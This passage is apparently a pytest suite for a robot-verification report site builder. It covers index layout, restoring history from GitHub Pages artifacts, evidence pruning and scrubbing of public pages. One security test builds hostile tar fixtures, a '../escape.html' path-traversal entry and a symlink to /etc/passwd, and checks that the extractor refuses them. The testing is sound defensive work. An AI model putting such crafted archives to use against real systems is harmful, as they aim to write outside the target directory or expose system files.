# SPDX-License-Identifier: Apache-2.0
"""Tests for single-robot verification reports (`src/reports_site.py` and `src/site_action.py`)."""

from __future__ import annotations

import ast
import collections
import email.message
import hashlib
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from html.parser import HTMLParser
from pathlib import Path

import pytest

import reports_restore
import reports_site as site_tool
import site_action
import site_fixture

REPO = "Living-Proof-Labs/livingproof-unitree-g1"
REPO_ID = 1441484729
ARCHIVE_URL = "https://api.example/7/zip"
BLOB_URL = "https://objects.githubusercontent.example/github-pages/artifact"
SITE_URL = "https://docs.example/livingproof-unitree-g1/"


def _make_run_folder(
    parent: Path,
    name: str,
    *,
    repository: str = REPO,
    variant: str = "stock-mujoco-hallway",
    capability: str = "walk-hallway",
    configuration: str = "stock",
    run_id: str = "100",
    created: str = "2026-11-20T06:00:00Z",
    grade: str = "FAIL",
    k: int | None = 12,
    n: int | None = 20,
    required_passes: int | None = 18,
    commit: str = "a" * 40,
    tag: str | None = "v2.3.32",
    spec_tag: str = "v3.1.0",
    spec_revision: str = "0.2.0",
    reporter_tag: str = "v3.15.4",
    finding: str | None = None,
    reproducibility: dict | None = None,
    evaluator_results: list[dict] | None = None,
    integrity_results: dict | None = None,
    evidence_files: dict[str, bytes] | None = None,
    html_override: str | None = None,
    thresholds_bytes: bytes | None = None,
) -> Path:
    folder = parent / name
    folder.mkdir(parents=True, exist_ok=True)

    if evaluator_results is None:
        if grade == "UNSUPPORTED":
            results = []
        else:
            ev_doc: dict = {
                "format": "livingproof-evaluator-result/1.1.0",
                "evaluator": {"id": "livingproof-scenario", "display_name": "Scenario"},
                "descriptor": {
                    "title": "Scenario",
                    "purpose": "Evaluates scenario completion.",
                },
            }
            if finding:
                ev_doc["grade"] = "FAIL"
                ev_doc["findings"] = [{"summary": finding}]
            if thresholds_bytes is not None:
                (folder / "thresholds.json").write_bytes(thresholds_bytes)
                ev_doc["inputs"] = [
                    {
                        "role": "thresholds",
                        "uri": "thresholds.json",
                        "sha256": hashlib.sha256(thresholds_bytes).hexdigest(),
                    }
                ]
            results = [{"id": "trial-01", "evaluator_results": [ev_doc]}]
    else:
        results = [{"id": "trial-01", "evaluator_results": evaluator_results}]

    source_bundle: dict = {"results": results}
    if integrity_results is not None:
        source_bundle["assessment"] = {"integrity_results": integrity_results}

    robot_slug = repository.rsplit("/", 1)[-1].removeprefix("livingproof-").lower()
    summary: dict = {
        "capability": capability,
        "spec": {
            "repository": "Living-Proof-Labs/robot-capability-specs",
            "tag": spec_tag,
            "commit": "b" * 40,
            "capability": capability,
            "revision": spec_revision,
        },
        "system": {"id": f"{robot_slug}/{configuration}", "version": "1.1.1"},
        "grade": grade,
        "k": k,
        "n": n,
        "required_passes": required_passes,
    }
    if reproducibility is not None:
        summary["reproducibility"] = reproducibility

    report = {
        "report_version": "1.0.0",
        "source_bundle": source_bundle,
        "summaries": [summary],
    }
    (folder / "report.json").write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")

    evidence_markup = ""
    if evidence_files:
        ev_dir = folder / "evidence"
        ev_dir.mkdir(parents=True, exist_ok=True)
        links_html = []
        for rel_name, payload in evidence_files.items():
            dest = ev_dir / rel_name
            dest.parent.mkdir(parents=True, exist_ok=True)
            dest.write_bytes(payload)
            if rel_name.endswith(".mp4"):
                links_html.append(f"<video controls src='evidence/{rel_name}'></video>")
            else:
                links_html.append(f"<p><a href='evidence/{rel_name}'>{rel_name}</a></p>")
        evidence_markup = (
            "<section id='evidence'><p class='is-kept'>Evidence kept for 7 days</p>"
            + "".join(links_html)
            + "</section>"
        )

    if html_override is not None:
        html_text = html_override
    else:
        html_text = (
            "<!doctype html><html lang='en'><head><meta charset='utf-8'>"
            f"<title>{variant}</title></head><body><main>"
            "<section id='summary'><div id='evaluator-livingproof-scenario'>"
            f"<h1>{variant}: {grade}</h1></div></section>"
            f"{evidence_markup}</main></body></html>\n"
        )
    (folder / "report.html").write_text(html_text, encoding="utf-8")
    (folder / "report.md").write_text(f"# {variant}\n\nGrade: {grade}\n", encoding="utf-8")
    (folder / "report.txt").write_text(f"{variant}: {grade}\n", encoding="utf-8")

    commit_info: dict = {
        "sha": commit,
        "url": f"https://github.com/{repository}/commit/{commit}",
    }
    if tag:
        commit_info["tag"] = tag

    run_record = {
        "variant": variant,
        "verification": f"{robot_slug}-{variant}",
        "run": {
            "id": run_id,
            "url": f"https://github.com/{repository}/actions/runs/{run_id.split('-')[0]}",
            "created": created,
        },
        "commit": commit_info,
        "robot": {
            "repository": repository,
            "commit": commit,
            "configuration": configuration,
            "url": (
                f"https://github.com/{repository}/releases/tag/{tag}"
                if tag
                else f"https://github.com/{repository}/tree/{commit}"
            ),
            **({"tag": tag} if tag else {}),
        },
        "poster": {"type": "ci", "name": "CI"},
        "releases": {
            "specs": {
                "repository": "Living-Proof-Labs/robot-capability-specs",
                "tag": spec_tag,
                "commit": "b" * 40,
                "url": f"https://github.com/Living-Proof-Labs/robot-capability-specs/releases/tag/{spec_tag}",
            },
            "verifier": {
                "repository": "Living-Proof-Labs/capability-verifier",
                "tag": "v2.11.4",
                "commit": "c" * 40,
                "url": "https://github.com/Living-Proof-Labs/capability-verifier/releases/tag/v2.11.4",
            },
            "reporter": {
                "repository": "Living-Proof-Labs/livingproof-capability-report",
                "tag": reporter_tag,
                "commit": "d" * 40,
                "url": f"https://github.com/Living-Proof-Labs/livingproof-capability-report/releases/tag/{reporter_tag}",
            },
        },
    }
    (folder / "run.json").write_text(json.dumps(run_record, indent=2) + "\n", encoding="utf-8")

    summed = list(site_tool.REPORT_FILES)
    if (folder / "thresholds.json").is_file():
        summed.append("thresholds.json")
    (folder / "SHA256SUMS").write_text(
        "".join(f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n" for n in summed),
        encoding="utf-8",
    )
    return folder


def _pages_zip_from_docs_root(docs_root: Path) -> bytes:
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode="w") as tar:
        tar.add(docs_root, arcname=".")
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as archive:
        archive.writestr("artifact.tar", tar_buffer.getvalue())
    return zip_buffer.getvalue()


def _artifact_entry(
    identifier: int,
    branch: str,
    run_id: int,
    created: str,
    *,
    expired: bool = False,
    name: str = "github-pages-1",
    repo_id: int = REPO_ID,
    head_repo_id: object = REPO_ID,
) -> dict:
    return {
        "id": identifier,
        "name": name,
        "created_at": created,
        "expired": expired,
        "archive_download_url": ARCHIVE_URL,
        "workflow_run": {
            "id": run_id,
            "head_branch": branch,
            "head_repository_id": head_repo_id,
            "repository_id": repo_id,
        },
    }


def _workflow_run_payload(
    run_id: int,
    *,
    branch: str = "main",
    event: str = "workflow_run",
    path: str = ".github/workflows/release.yml",
    repo_id: object = REPO_ID,
    head_repo_id: object = REPO_ID,
) -> dict:
    return {
        "id": run_id,
        "event": event,
        "path": path,
        "head_branch": branch,
        "head_repository": {"id": head_repo_id, "full_name": REPO},
        "repository": {"id": repo_id, "full_name": REPO},
    }


def _card_aria_labels(index_html: str) -> list[str]:
    return re.findall(r'<a class="card-link"[^>]*aria-label="([^"]+)"', index_html)


# ---------------------------------------------------------------- index & single-robot layout


def test_single_robot_index_orders_failures_first_and_links_archived_history(tmp_path: Path):
    runs_in = tmp_path / "incoming"
    _make_run_folder(
        runs_in,
        "corner-left",
        variant="stock-mujoco-corner-left",
        capability="walk-corner-left",
        grade="PASS",
        k=1,
        n=1,
        required_passes=1,
    )
    _make_run_folder(
        runs_in,
        "unsupported-stairs",
        variant="stock-mujoco-stairs",
        capability="climb-stairs",
        grade="UNSUPPORTED",
        k=None,
        n=None,
        required_passes=None,
    )
    _make_run_folder(
        runs_in,
        "corner-right",
        variant="stock-mujoco-corner-right",
        capability="walk-corner-right",
        grade="INSUFFICIENT_EVIDENCE",
        k=0,
        n=1,
        required_passes=1,
        finding="Recording stopped early.",
    )
    _make_run_folder(
        runs_in,
        "hallway",
        variant="stock-mujoco-hallway",
        capability="walk-hallway",
        grade="FAIL",
        k=12,
        n=20,
        required_passes=18,
        finding="Drifted from the centreline.",
    )

    docs_root = tmp_path / "docs"
    docs_root.mkdir()
    (docs_root / "index.html").write_text(
        "<!doctype html><title>Manual</title>\n", encoding="utf-8"
    )
    reports_dir = docs_root / "reports"

    site_tool.build(reports_dir, runs_in)
    assert site_fixture.check_reports_tree(reports_dir) == []

    index = (reports_dir / "index.html").read_text(encoding="utf-8")
    # Single-robot layout: no cross-robot <details class="robot"> accordion.
    assert '<details class="robot"' not in index
    assert 'id="robots"' not in index
    assert '<p class="eyebrow">Unitree G1</p>' in index
    assert "<strong>1 latest result failed.</strong>" in index

    # Failures first, then insufficient evidence, then pass, then unsupported.
    assert _card_aria_labels(index) == [
        "Walk the hallway, latest report (FAIL)",
        "Walk around the corner (right), latest report (Insufficient evidence)",
        "Walk around the corner (left), latest report (PASS)",
        "Climb stairs, latest report (Not supported)",
    ]

    # Archived history link is present and points to the exact archived reports index.
    assert (
        'href="https://docs.livingprooflabs.com/livingproof-verification/reports/index.html"'
        in index
    )
    assert "Earlier history" in index


def test_single_robot_constraint_rejects_mixed_robots(tmp_path: Path):
    runs_in = tmp_path / "incoming"
    _make_run_folder(runs_in, "g1", repository="Living-Proof-Labs/livingproof-unitree-g1")
    _make_run_folder(runs_in, "t1", repository="Living-Proof-Labs/livingproof-booster-t1")

    with pytest.raises(site_tool.SiteError, match="one robot per site.*booster-t1, unitree-g1"):
        site_tool.build(tmp_path / "reports", runs_in)


def test_index_all_pass_and_empty_states(tmp_path: Path):
    empty_html = site_tool._index_page_html({})
    assert '<p class="status">No verification reports published yet.</p>' in empty_html
    assert 'class="all-pass"' not in empty_html
    assert site_tool.ARCHIVED_REPORTS_URL in empty_html

    runs_in = tmp_path / "incoming"
    _make_run_folder(
        runs_in,
        "hallway",
        variant="stock-mujoco-hallway",
        grade="PASS",
        k=20,
        n=20,
        required_passes=18,
    )
    _make_run_folder(
        runs_in,
        "corner-left",
        variant="stock-mujoco-corner-left",
        capability="walk-corner-left",
        grade="PASS",
        k=1,
        n=1,
        required_passes=1,
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in)
    index = (reports_dir / "index.html").read_text(encoding="utf-8")
    assert '<p class="all-pass">All 2 latest results pass.</p>' in index
    assert "failed" not in index


# ---------------------------------------------------------------- history, restore & immutability


def test_run_n_plus_one_restores_from_pages_artifact_and_keeps_run_n_immutable(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    """Run N is in the deployed Pages artifact; Run N+1 restores it and adds itself."""
    # --- Run N (100) ---
    run1_input = tmp_path / "run1-in"
    site_fixture.write(
        run1_input,
        run_id="100",
        created="2026-11-20T06:00:00Z",
        repository=REPO,
        commit="1" * 40,
        tag="v2.3.31",
    )
    docs_v1 = tmp_path / "docs-v1"
    docs_v1.mkdir()
    (docs_v1 / "index.html").write_text("<!doctype html><title>G1 Manual v2.3.31</title>\n")
    (docs_v1 / "obsolete-manual-page.html").write_text(
        "Old manual page that must not leak into reports/"
    )

    reports_v1 = docs_v1 / "reports"
    site_tool.build(reports_v1, run1_input)
    assert site_fixture.check_reports_tree(reports_v1) == []

    # Snapshot every file in runs/100/ after Run N to verify byte-for-byte immutability.
    run100_dir_v1 = reports_v1 / "unitree-g1/stock-mujoco-hallway/runs/100"
    run100_bytes_before = {
        p.relative_to(run100_dir_v1).as_posix(): p.read_bytes()
        for p in sorted(run100_dir_v1.rglob("*"))
        if p.is_file()
    }
    assert "index.html" in run100_bytes_before
    assert "evidence/trials.mcap" in run100_bytes_before

    pages_archive = _pages_zip_from_docs_root(docs_v1)

    # Simulate an intervening failed deploy (run 150) above the last successful deploy (run 100).
    artifacts_list = [
        _artifact_entry(9, "main", 150, "2026-11-21T06:00:00Z", name="github-pages-150-1"),
        _artifact_entry(7, "main", 100, "2026-11-20T06:05:00Z", name="github-pages-1"),
    ]

    def fake_request(url: str, token: str | None):
        path = urllib.parse.urlsplit(url).path.rstrip("/")
        if path == f"/repos/{REPO}":
            return io.BytesIO(json.dumps({"id": REPO_ID, "full_name": REPO}).encode())
        if path == f"/repos/{REPO}/actions/runs/150/jobs":
            return io.BytesIO(
                json.dumps(
                    {"jobs": [{"name": "deploy-manual / deploy", "conclusion": "failure"}]}
                ).encode()
            )
        if path == f"/repos/{REPO}/actions/runs/100/jobs":
            return io.BytesIO(
                json.dumps(
                    {
                        "jobs": [
                            {"name": "release / release", "conclusion": "success"},
                            {"name": "deploy-manual / build", "conclusion": "success"},
                            {"name": "deploy-manual / deploy", "conclusion": "success"},
                        ]
                    }
                ).encode()
            )
        if "/actions/runs/" in path:
            rid = int(path.rsplit("/", 1)[-1])
            return io.BytesIO(json.dumps(_workflow_run_payload(rid)).encode())
        return io.BytesIO(json.dumps({"artifacts": artifacts_list}).encode())

    def fake_open_once(url: str, token: str | None):
        if url == ARCHIVE_URL:
            assert token == "ghs_test_token"
            headers = email.message.Message()
            headers["Location"] = BLOB_URL
            raise urllib.error.HTTPError(url, 302, "Found", headers, None)
        if url == BLOB_URL:
            # Token must never be forwarded to blob storage.
            assert token is None
            return io.BytesIO(pages_archive)
        raise AssertionError(f"Unexpected URL {url}")

    monkeypatch.setattr(reports_restore, "_request", fake_request)
    monkeypatch.setattr(reports_restore, "_open_once", fake_open_once)

    # --- Run N+1 (200) ---
    run2_input = tmp_path / "run2-in"
    site_fixture.write(
        run2_input,
        run_id="200",
        created="2026-11-22T06:00:00Z",
        repository=REPO,
        commit="2" * 40,
        tag="v2.3.32",
    )
    docs_v2 = tmp_path / "docs-v2"
    docs_v2.mkdir()
    (docs_v2 / "index.html").write_text("<!doctype html><title>G1 Manual v2.3.32</title>\n")
    reports_v2 = docs_v2 / "reports"

    restored_artifact = site_tool.restore(
        reports_v2, REPO, branch="main", current_run=200, token="ghs_test_token"
    )
    assert restored_artifact is not None and restored_artifact["id"] == 7
    assert not (reports_v2 / "obsolete-manual-page.html").exists()

    site_tool.build(reports_v2, run2_input)
    assert site_fixture.check_reports_tree(reports_v2) == []

    # Both runs 100 and 200 are present; history is newest first; latest/ points to 200.
    hallway_base = reports_v2 / "unitree-g1/stock-mujoco-hallway"
    assert sorted(p.name for p in (hallway_base / "runs").iterdir()) == ["100", "200"]
    history_html = (hallway_base / "index.html").read_text(encoding="utf-8")
    assert "2 runs, newest first." in history_html
    assert history_html.index('href="runs/200/"') < history_html.index('href="runs/100/"')
    assert '<a href="latest/">Latest report</a>' in history_html
    latest_html = (hallway_base / "latest/index.html").read_text(encoding="utf-8")
    assert "url=../runs/200/" in latest_html

    index_html = (reports_v2 / "index.html").read_text(encoding="utf-8")
    assert "History (2)" in index_html

    # Run 100 remains completely immutable byte-for-byte.
    run100_dir_v2 = hallway_base / "runs/100"
    run100_bytes_after = {
        p.relative_to(run100_dir_v2).as_posix(): p.read_bytes()
        for p in sorted(run100_dir_v2.rglob("*"))
        if p.is_file()
    }
    assert run100_bytes_after == run100_bytes_before

    # Attempting to overwrite historical run 100 in a subsequent run 300 is refused.
    collide_input = tmp_path / "collide"
    site_fixture.write(collide_input, run_id="100", created="2026-11-23T06:00:00Z", repository=REPO)
    with pytest.raises(site_tool.SiteError, match="already published in history and is immutable"):
        site_tool.build(reports_v2, collide_input)


def test_restore_handles_manual_only_pages_artifact_before_first_report(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    """A pre-reports manual Pages artifact with no reports/ directory restores 0 files cleanly."""
    manual_only = tmp_path / "manual-only"
    manual_only.mkdir()
    (manual_only / "index.html").write_text("<!doctype html><title>Manual only</title>\n")
    archive = _pages_zip_from_docs_root(manual_only)

    artifacts_list = [_artifact_entry(5, "main", 90, "2026-11-19T00:00:00Z")]

    def fake_request(url: str, token: str | None):
        path = urllib.parse.urlsplit(url).path.rstrip("/")
        if path == f"/repos/{REPO}":
            return io.BytesIO(json.dumps({"id": REPO_ID, "full_name": REPO}).encode())
        if path.endswith("/jobs"):
            return io.BytesIO(
                json.dumps({"jobs": [{"name": "deploy", "conclusion": "success"}]}).encode()
            )
        if "/actions/runs/" in path:
            return io.BytesIO(json.dumps(_workflow_run_payload(90, event="push")).encode())
        return io.BytesIO(json.dumps({"artifacts": artifacts_list}).encode())

    monkeypatch.setattr(reports_restore, "_request", fake_request)
    monkeypatch.setattr(reports_restore, "_open_once", lambda url, token: io.BytesIO(archive))

    dest = tmp_path / "reports"
    found = site_tool.restore(dest, REPO, "main", 100, "tok")
    assert found is not None and found["id"] == 5
    assert list(dest.iterdir()) == []


def test_restore_security_and_failure_modes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    # 1. Unsafe tar path is rejected.
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w") as tar:
        info = tarfile.TarInfo("../escape.html")
        tar.addfile(info, io.BytesIO(b"bad"))
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr("artifact.tar", tar_buf.getvalue())
    with pytest.raises(site_tool.SiteError, match="Unsafe path"):
        site_tool.extract_pages_reports(zip_buf.getvalue(), tmp_path / "out")

    # 2. Symlink inside tar is rejected.
    tar_sym = io.BytesIO()
    with tarfile.open(fileobj=tar_sym, mode="w") as tar:
        sym = tarfile.TarInfo("reports/link")
        sym.type = tarfile.SYMTYPE
        sym.linkname = "/etc/passwd"
        tar.addfile(sym)
    zip_sym = io.BytesIO()
    with zipfile.ZipFile(zip_sym, "w") as zf:
        zf.writestr("artifact.tar", tar_sym.getvalue())
    with pytest.raises(site_tool.SiteError, match="Unexpected entry"):
        site_tool.extract_pages_reports(zip_sym.getvalue(), tmp_path / "out2")

    # 3. Fork artifact & pull_request event artifact are ignored; boolean repo ID is rejected.
    assert reports_restore._github_id(True) is None
    fork_artifact = _artifact_entry(1, "main", 10, "2026-11-20T00:00:00Z", head_repo_id=999999)
    assert not reports_restore._listed_run_is_this_repository(fork_artifact, REPO_ID)
    pr_run = _workflow_run_payload(11, event="pull_request")
    assert not reports_restore._fetched_run_is_pages_deploy(pr_run, REPO_ID, "main")

    # 4. Expired newest deployed artifact raises SiteError unless reset_history=True.
    expired_list = [_artifact_entry(8, "main", 100, "2026-08-01T00:00:00Z", expired=True)]

    def fake_expired_req(url: str, token: str | None):
        path = urllib.parse.urlsplit(url).path.rstrip("/")
        if path == f"/repos/{REPO}":
            return io.BytesIO(json.dumps({"id": REPO_ID}).encode())
        if path.endswith("/jobs"):
            return io.BytesIO(
                json.dumps({"jobs": [{"name": "pages", "conclusion": "success"}]}).encode()
            )
        if "/actions/runs/" in path:
            return io.BytesIO(json.dumps(_workflow_run_payload(100)).encode())
        return io.BytesIO(json.dumps({"artifacts": expired_list}).encode())

    monkeypatch.setattr(reports_restore, "_request", fake_expired_req)
    with pytest.raises(site_tool.SiteError, match="expired"):
        site_tool.restore(tmp_path / "exp", REPO, "main", 200, "tok", site_url=SITE_URL)
    assert (
        site_tool.restore(
            tmp_path / "exp", REPO, "main", 200, "tok", site_url=SITE_URL, reset_history=True
        )
        is None
    )

    # 5. Live site check probes reports/site.json and reports/index.html, not root index.html.
    monkeypatch.setattr(reports_restore, "_request", lambda u, t: io.BytesIO(b'{"artifacts": []}'))
    probed: list[str] = []

    def fake_status_404(url: str) -> int:
        probed.append(url)
        return 404

    monkeypatch.setattr(reports_restore, "_fetch_status", fake_status_404)
    assert site_tool.restore(tmp_path / "fresh", REPO, "main", 1, "tok", site_url=SITE_URL) is None
    assert probed == [SITE_URL + "reports/site.json", SITE_URL + "reports/index.html"]

    monkeypatch.setattr(reports_restore, "_fetch_status", lambda url: 200)
    with pytest.raises(site_tool.SiteError, match="reset-history"):
        site_tool.restore(tmp_path / "live", REPO, "main", 1, "tok", site_url=SITE_URL)


def test_restore_retries_transient_503_on_blob_download(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    docs = tmp_path / "docs"
    runs_in = tmp_path / "in"
    site_fixture.write(runs_in, run_id="100", created="2026-11-20T00:00:00Z")
    site_tool.build(docs / "reports", runs_in)
    archive = _pages_zip_from_docs_root(docs)

    artifacts_list = [_artifact_entry(7, "main", 100, "2026-11-20T00:05:00Z")]

    def fake_request(url: str, token: str | None):
        path = urllib.parse.urlsplit(url).path.rstrip("/")
        if path == f"/repos/{REPO}":
            return io.BytesIO(json.dumps({"id": REPO_ID}).encode())
        if path.endswith("/jobs"):
            return io.BytesIO(
                json.dumps({"jobs": [{"name": "deploy", "conclusion": "success"}]}).encode()
            )
        if "/actions/runs/" in path:
            return io.BytesIO(json.dumps(_workflow_run_payload(100)).encode())
        return io.BytesIO(json.dumps({"artifacts": artifacts_list}).encode())

    headers = email.message.Message()
    headers["Location"] = BLOB_URL
    redirect = urllib.error.HTTPError(ARCHIVE_URL, 302, "Found", headers, None)
    blob_503 = urllib.error.HTTPError(
        BLOB_URL, 503, "Service Unavailable", email.message.Message(), None
    )
    queue = [redirect, blob_503, redirect, archive]
    calls: list[tuple[str, str | None]] = []
    sleeps: list[float] = []

    def fake_open(url: str, token: str | None):
        calls.append((url, token))
        nxt = queue.pop(0)
        if isinstance(nxt, BaseException):
            raise nxt
        return io.BytesIO(nxt)

    monkeypatch.setattr(reports_restore, "_request", fake_request)
    monkeypatch.setattr(reports_restore, "_open_once", fake_open)
    monkeypatch.setattr(reports_restore.time, "sleep", sleeps.append)
    monkeypatch.setattr(reports_restore.random, "uniform", lambda _a, _b: 1.0)

    dest = tmp_path / "restored"
    found = site_tool.restore(dest, REPO, "main", 200, "secret_tok")
    assert found is not None and found["id"] == 7
    assert calls == [(ARCHIVE_URL, "secret_tok"), (BLOB_URL, None)] * 2
    assert sleeps == [10]
    assert (dest / "unitree-g1/stock-mujoco-hallway/runs/100/run.json").is_file()


# ---------------------------------------------------------------- configurable MCAP & video pruning


def test_mcap_and_video_pruned_after_configurable_days_keeping_pages_and_checksums(tmp_path: Path):
    run1 = tmp_path / "r1"
    _make_run_folder(
        run1,
        "hallway",
        run_id="100",
        created="2026-11-01T00:00:00Z",
        grade="FAIL",
        finding="Drifted.",
        evidence_files={
            "trials.mcap": b"mcap recording payload",
            "seed-01-fail.mp4": b"mp4 video payload",
        },
        thresholds_bytes=b'{"max_lateral_drift_m": 0.5}\n',
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, run1, now="2026-11-01T00:00:00Z", days=7)

    run100 = reports_dir / "unitree-g1/stock-mujoco-hallway/runs/100"
    assert (run100 / "evidence/trials.mcap").is_file()
    assert (run100 / "evidence/seed-01-fail.mp4").is_file()
    assert (run100 / "thresholds.json").is_file()
    assert "Evidence kept for 7 days" in (run100 / "index.html").read_text(encoding="utf-8")
    assert site_fixture.check_reports_tree(reports_dir) == []
    subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=run100, check=True, capture_output=True)

    # 4 days later with retention=7 days: MCAP and video are still retained.
    run2 = tmp_path / "r2"
    _make_run_folder(
        run2,
        "hallway",
        run_id="200",
        created="2026-11-05T00:00:00Z",
        grade="PASS",
        k=20,
        n=20,
        required_passes=18,
    )
    site_tool.build(reports_dir, run2, now="2026-11-05T00:00:00Z", days=7)
    assert (run100 / "evidence/trials.mcap").is_file()
    assert (run100 / "evidence/seed-01-fail.mp4").is_file()

    # With configurable retention=3 days at 2026-11-05 (4 days old): MCAP and video are pruned!
    run3 = tmp_path / "r3"
    _make_run_folder(
        run3,
        "hallway",
        run_id="300",
        created="2026-11-05T12:00:00Z",
        grade="PASS",
        k=20,
        n=20,
        required_passes=18,
    )
    site_tool.build(reports_dir, run3, now="2026-11-05T12:00:00Z", days=3)

    assert not (run100 / "evidence/trials.mcap").exists()
    assert not (run100 / "evidence/seed-01-fail.mp4").exists()

    # Report pages, thresholds.json, run.json, and SHA256SUMS remain and verify cleanly.
    for kept in (
        "index.html",
        "report.html",
        "report.json",
        "report.md",
        "report.txt",
        "run.json",
        "thresholds.json",
        "SHA256SUMS",
    ):
        assert (run100 / kept).is_file(), kept

    pruned_page = (run100 / "index.html").read_text(encoding="utf-8")
    assert "Evidence expired after 3 days" in pruned_page
    assert "Evidence kept for" not in pruned_page
    assert "trials.mcap" in pruned_page  # label text remains without broken link
    assert "href='evidence/" not in pruned_page and 'href="evidence/' not in pruned_page
    assert site_fixture.check_reports_tree(reports_dir) == []
    subprocess.run(["sha256sum", "-c", "SHA256SUMS"], cwd=run100, check=True, capture_output=True)


# ---------------------------------------------------------------- chips, integrity & scrubbing


def test_evidence_manifest_controller_artifact_is_published(tmp_path: Path):
    manifest = {
        "format": "livingproof-evidence-manifest/1.0.0",
        "configuration": {
            "profile": {
                "controller": {
                    "publisher": "Unitree Robotics",
                    "artifact": {
                        "repo": "https://github.com/unitreerobotics/unitree_rl_gym",
                        "path": "deploy/pre_train/g1/motion.pt",
                        "commit": "a" * 40,
                        "sha256": "b" * 64,
                        "license": "BSD-3-Clause",
                    },
                }
            }
        },
    }
    payload = (json.dumps(manifest, indent=2) + "\n").encode()
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in")
    published = json.loads(
        next(reports.rglob("evidence/manifest.json")).read_text(encoding="utf-8")
    )
    stored = published["configuration"]["profile"]["controller"]["artifact"]
    assert stored["path"] == "deploy/pre_train/g1/motion.pt"
    assert site_tool.public_page_problems(reports) == []


def _manifest_with_controller_artifact(artifact: dict, **extra: object) -> bytes:
    document = {
        "format": "livingproof-evidence-manifest/1.0.0",
        "configuration": {"profile": {"controller": {"artifact": artifact}}},
    }
    document.update(extra)
    return (json.dumps(document) + "\n").encode()


def test_other_manifest_artifact_key_is_refused(tmp_path: Path):
    payload = _manifest_with_controller_artifact(
        {"path": "deploy/pre_train/g1/motion.pt"},
        notes={"artifact": {"name": "motion.pt"}},
    )
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    with pytest.raises(site_tool.SiteError, match="manifest.json mentions an artifact"):
        site_tool.build(tmp_path / "reports", tmp_path / "in")


def test_artifact_wording_inside_controller_artifact_values_is_refused(tmp_path: Path):
    payload = _manifest_with_controller_artifact(
        {"path": "deploy/pre_train/g1/motion.pt", "note": "shipped artifact"}
    )
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    with pytest.raises(site_tool.SiteError, match="manifest.json mentions an artifact"):
        site_tool.build(tmp_path / "reports", tmp_path / "in")


def test_duplicate_controller_artifact_key_is_refused(tmp_path: Path):
    payload = (
        b'{"configuration":{"profile":{"controller":'
        b'{"artifact":"leaked artifact wording","artifact":{"path":"m"}}}}}\n'
    )
    _make_run_folder(tmp_path / "in", "hallway", evidence_files={"manifest.json": payload})
    with pytest.raises(site_tool.SiteError, match="manifest.json mentions an artifact"):
        site_tool.build(tmp_path / "reports", tmp_path / "in")


def test_artifact_wording_in_rendered_page_text_is_refused(tmp_path: Path):
    reports = tmp_path / "reports"
    reports.mkdir()
    page = reports / "index.html"
    page.write_text("<p>Download the artifact.</p>", encoding="utf-8")
    assert site_tool.public_page_problems(reports) == ["index.html mentions an artifact"]
    assert site_tool.html_is_dirty(page.read_text(encoding="utf-8"))
    page.write_text(
        "<p><a href='https://github.com/org/repo/actions/runs/1'>run</a></p>", encoding="utf-8"
    )
    assert site_tool.public_page_problems(reports) == ["index.html links to /actions/"]


def test_actions_urls_and_artifact_wording_are_scrubbed_from_public_files(tmp_path: Path):
    runs_in = tmp_path / "in"
    folder = _make_run_folder(
        runs_in,
        "hallway",
        html_override=(
            "<!doctype html><html><body><main>"
            "<p>See <a href='https://github.com/org/repo/actions/runs/7/artifacts/101'>"
            "MCAP artifact</a> "
            "and https://github.com/org/repo/actions/runs/7</p>"
            "</main></body></html>\n"
        ),
    )
    rep = json.loads((folder / "report.json").read_text(encoding="utf-8"))
    rep["evidence_links"] = {
        "run": "https://github.com/org/repo/actions/runs/7",
        "links": [
            {
                "label": "MCAP",
                "kind": "mcap",
                "url": "https://github.com/org/repo/actions/runs/7/artifacts/101",
            },
            {"label": "External note", "kind": "note", "url": "https://example.com/note"},
        ],
    }
    (folder / "report.json").write_text(json.dumps(rep), encoding="utf-8")
    (folder / "report.md").write_text(
        "Artifact at https://github.com/org/repo/actions/runs/7\n", encoding="utf-8"
    )
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )

    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in)
    assert site_tool.public_page_problems(reports_dir) == []
    assert site_fixture.check_reports_tree(reports_dir) == []


def test_inconclusive_integrity_and_spec_changed_chips_and_compared_runs(tmp_path: Path):
    inconclusive_doc = {
        "format": "livingproof-evaluator-result/1.2.0",
        "evaluator": {"id": "livingproof-run-integrity", "display_name": "Run Integrity"},
        "descriptor": {"title": "Run Integrity", "purpose": "Checks recording integrity."},
        "integrity": {"run": {"test_system_status": "INCONCLUSIVE"}},
    }
    r1 = tmp_path / "r1"
    _make_run_folder(
        r1,
        "hallway",
        run_id="100",
        created="2026-11-20T00:00:00Z",
        grade="PASS",
        k=None,
        n=None,
        required_passes=None,
        spec_tag="v3.0.0",
        reproducibility={"compared": True, "statement": "3 of 3 repeats agree"},
        integrity_results={"livingproof-run-integrity": inconclusive_doc},
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, r1)

    r2 = tmp_path / "r2"
    _make_run_folder(
        r2,
        "hallway",
        run_id="200",
        created="2026-11-21T00:00:00Z",
        grade="FAIL",
        spec_tag="v3.1.0",
